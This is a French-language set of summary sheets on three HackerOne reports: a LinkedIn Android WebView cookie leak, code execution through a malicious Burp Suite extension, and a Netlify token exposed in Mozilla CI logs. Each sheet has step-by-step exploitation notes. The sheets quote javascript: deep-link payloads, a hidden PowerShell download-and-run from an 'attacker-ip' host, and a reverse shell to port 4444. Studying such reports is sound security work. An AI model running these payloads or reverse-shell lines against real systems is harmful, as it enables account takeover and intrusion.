# Fiches SSS — Information Disclosure & Credential Leaks

*3 cas sélectionnés dans le corpus 2025-2026 (HackerOne).*

### Session Cookie Leakage via Static Header Field in WebViewerFragment

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3475626)

Dans l'app Android LinkedIn, `WebViewerFragment.loadUrl()` place les cookies de l'URL courante dans `WebViewerFragment.CUSTOM_HEADERS`, un `ArrayMap` statique jamais nettoyé : les cookies du site A sont envoyés au site B. Chaîne d'exploitation : deep-link `https://www.linkedin.com/trust/verification` dont `verificationUrl` accepte le schéma `javascript:` (host seul validé), paramètre `renderContext` neutralisé en fermant la chaîne après `#`, interface `Android.sendWebMessage()` qui lance le fragment vulnérable, regex `FIRST_PARTY_ARTICLE_PATTERN` non ancrée qui force le client `web_viewer`. Le second message charge le serveur de l'attaquant, qui reçoit les cookies de session LinkedIn (prise de contrôle de compte).

**Cause racine :** champ statique conservant les cookies d'une URL à l'autre dans `WebViewerFragment` (état partagé non purgé), combiné à une validation de schéma absente et à une regex de host non ancrée.

**Preuve technique (verbatim depuis la source) :**

```java
        ArrayMap arrayMap0 = WebViewerFragment.CUSTOM_HEADERS; // Static field!
        ...
        if(s2 != null) {
            arrayMap0.put("Cookie", s2);
        }
        this.webView.loadUrl(s, arrayMap0);
```
```text
javascript://www.linkedin.com/%0aalert('1#')
javascript://www.linkedin.com/%0aalert('1?renderContext=trustVerificationDeeplink#')
```
```java
WebViewerUtils.FIRST_PARTY_ARTICLE_PATTERN = Pattern.compile("(http|https)://www.linkedin(-ei)?.com/pulse/+");
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : appareil Android avec l'app LinkedIn installée ; un domaine attaquant hébergeant la page HTML de PoC (`{COLLABORATOR_HOST}`) ; la victime ouvre la page dans un navigateur mobile puis tape le lien.
- Étapes : 1. héberger le HTML de PoC (deep-link `trust/verification` + payload `javascript:` encodé) en remplaçant `{COLLABORATOR_HOST}`. 2. Faire ouvrir la page à la victime depuis un navigateur mobile et taper « Click Here » : la WebView LinkedIn s'ouvre. 3. Au retour/fermeture, une seconde WebView s'ouvre vers `{COLLABORATOR_HOST}` (appels espacés de 1000 ms). 4. Observer le header `Cookie` (tokens de session) dans les logs serveur.
- Pièges / limites : payload à double encodage (`%250a`) et fermeture `'#')` pour rendre le JavaScript valide malgré le paramètre ajouté ; sans navigation préalable vers linkedin.com, le champ statique est vide.

**Reproductibilité :** moyenne — payload et étapes complets, mais exigent un appareil Android avec l'app, un domaine hébergé et un clic de la victime.

**Techniques :** static field state persistence, webview javascript scheme injection, url fragment smuggling, javascript interface abuse, unanchored regex bypass, cookie exfiltration

**Correspond aux classes qualifiantes :** ato (vol de cookies de session), info disclosure, webview javascript injection

**Signal (endpoints/fonctions observés) :**
- `WebViewerFragment.loadUrl()` / `WebViewerFragment.CUSTOM_HEADERS`
- `https://www.linkedin.com/trust/verification?verificationUrl=`
- `Android.sendWebMessage()` (`additionalWebViewUrl`)
- `WebViewerUtils.isLinkedInArticleUrl()` / `FIRST_PARTY_ARTICLE_PATTERN`

**Paramètres impliqués :** `verificationUrl`, `additionalWebViewUrl`, `renderContext`

### Burp Suite extensions can execute arbitrary code

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/3014158)

Le rapport démontre qu'une extension Burp Suite s'exécute avec les privilèges de l'utilisateur : une extension Python anodine peut créer un script PowerShell caché qui télécharge un payload distant, ouvrir un reverse shell Netcat et exécuter des commandes système en arrière-plan. La source souligne que la signature d'extensions existe mais que beaucoup d'utilisateurs la désactivent ou installent des extensions non vérifiées. Le rapport a été classé *informative* (`substate: informative`) ; le PoC complet est référencé comme pièce jointe (`{F4093216}`).

**Cause racine :** le framework d'extensions exécute du code tiers non sandboxé avec les privilèges de l'utilisateur (pas de restriction imposée sur `subprocess.Popen()`/`os.system()` ni de signature obligatoire), ce qui transforme l'installation d'une extension en vecteur d'exécution de code.

**Preuve technique (verbatim depuis la source) :**

```python
       file.write("Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -C \"IEX(New-Object Net.WebClient).DownloadString(\'http://attacker-ip:8000/rev.ps1\')\"'")
```
```python
   subprocess.Popen(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", file_path], shell=True)
```
```powershell
$client = New-Object System.Net.Sockets.TCPClient("attacker-ip",4444);
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : convaincre la cible d'installer l'extension malveillante (modèle « Trojan horse ») ; le PoC complet est une pièce jointe absente du texte (`{F4093216}`).
- Étapes : 1. créer une extension Burp au comportement visible inoffensif (calculatrice, notepad). 2. Y embarquer l'écriture de `poc.ps1` dans le répertoire de l'extension, exécuté via `powershell.exe -ExecutionPolicy Bypass -File`. 3. Le script PowerShell télécharge et exécute un payload distant, puis ouvre un reverse shell Netcat vers l'attaquant. 4. Faire installer l'extension par la cible et constater l'accès persistant.
- Pièges / limites : non documenté dans la source pour les canaux de distribution de l'extension ; le rapport est en sous-état *informative* (`substate: informative`) sans motif de triage explicite dans la source ; le PoC complet est annoncé comme pièce jointe (`{F4093216}`), absente du texte brut.

**Reproductibilité :** moyenne — snippets d'exécution fournis, mais l'attaque exige l'installation volontaire de l'extension par la victime et le PoC complet reste hors texte (pièce jointe non exportée).

**Techniques :** malicious extension, trojan horse, powershell staging, reverse shell, persistence, unsigned extension install

**Correspond aux classes qualifiantes :** rce (client-side, via extension), ato/social engineering (installation d'une extension)

**Signal (endpoints/fonctions observés) :**
- `subprocess.Popen(...)` dans une extension Burp (Python/Jython)
- `powershell.exe -ExecutionPolicy Bypass -File poc.ps1`
- `IEX(New-Object Net.WebClient).DownloadString(...)`, reverse shell TCP (`TCPClient("attacker-ip",4444)`)

**Paramètres impliqués :** `file_path`, `attacker-ip`, port `4444`

### Netlify Authentication Token Exposed in Public Mozilla CI Logs

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/2915647)

Un token d'authentification Netlify du compte « Mozilla IT Web SRE » a été trouvé dans un log CI public de Mozilla (`live.log`, task `d5NRF8FdQamV9XdPO_mTBQ`, mot-clé `auth:`). Le token, valide pour l'API Netlify, portait les rôles Owner, Developer, Billing Admin, Reviewer, Publisher et Content Editor, donnant un contrôle complet sur les sites (dont `https://crash-pings.mozilla.org`), le déploiement, les variables d'environnement, les logs et la facturation. Le rapport liste comme risques le détournement de l'email de facturation, la compromission de sites, l'exposition de données et la perte définitive de contrôle. La valeur du token est masquée (`███`) dans le rapport.

**Cause racine :** un pipeline CI a écrit un token d'authentification vivant dans des logs de build accessibles publiquement, sans masquage — exposition de credential dans un artefact public.

**Preuve technique (verbatim depuis la source) :**

```
curl -X GET https://api.netlify.com/api/v1/accounts -H "Authorization: Bearer ████" -s | jq

    "roles_allowed": [
      "Owner",
      "Developer",
      "Billing Admin",
      "Reviewer",
      "Publisher",
      "Content Editor"
    ],

   - Search for the keyword `auth:` in the log file.
   - Extract the Netlify token (e.g., `███`).
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : aucun compte — la page de log est publique : `https://firefox-ci-tc.services.mozilla.com/tasks/d5NRF8FdQamV9XdPO_mTBQ/runs/0/logs/public/logs/live.log`. Le token réel est masqué dans le rapport (non rejouable tel quel).
- Étapes : 1. Ouvrir l'URL du log public. 2. Chercher le mot-clé `auth:` et extraire le token Netlify. 3. Vérifier sa validité : `curl -X GET https://api.netlify.com/api/v1/accounts -H "Authorization: Bearer <token>" -s | jq` → réponse contenant les infos du compte (name, role, billing_email, roles_allowed, saml_config…). 4. Confirmer l'accès complet via les autres endpoints de l'API Netlify (déployer, supprimer, modifier des sites ; lire variables d'environnement et logs) — la documentation référence est `https://open-api.netlify.com`.
- Pièges / limites : le token est intégralement masqué (`███`) et a vraisemblablement été révoqué ; le rejeu nécessite un log équivalent non nettoyé. La source recommande révocation, audit des pipelines (masquage) et scopes OAuth/IP allowlisting.

**Reproductibilité :** basse — le credential est masqué dans la source et la révocation n'est qu'une recommandation du rapport (non confirmée) ; seule la technique (fouille de logs CI publics) est rejouable, pas l'artefact.

**Techniques :** secrets in public ci logs, token leak, public build logs, api token abuse, credential exposure, log mining

**Correspond aux classes qualifiantes :** information disclosure, credential leak, ato (account/site takeover)

**Signal (endpoints/fonctions observés) :**
- log public `…/tasks/d5NRF8FdQamV9XdPO_mTBQ/runs/0/logs/public/logs/live.log` (mot-clé `auth:`)
- `https://api.netlify.com/api/v1/accounts` avec `Authorization: Bearer`
- compte « Mozilla IT Web SRE », site `https://crash-pings.mozilla.org`

**Paramètres impliqués :** `Authorization: Bearer`, `billing_email`, `selected_access_site_ids`, `roles_allowed`

---

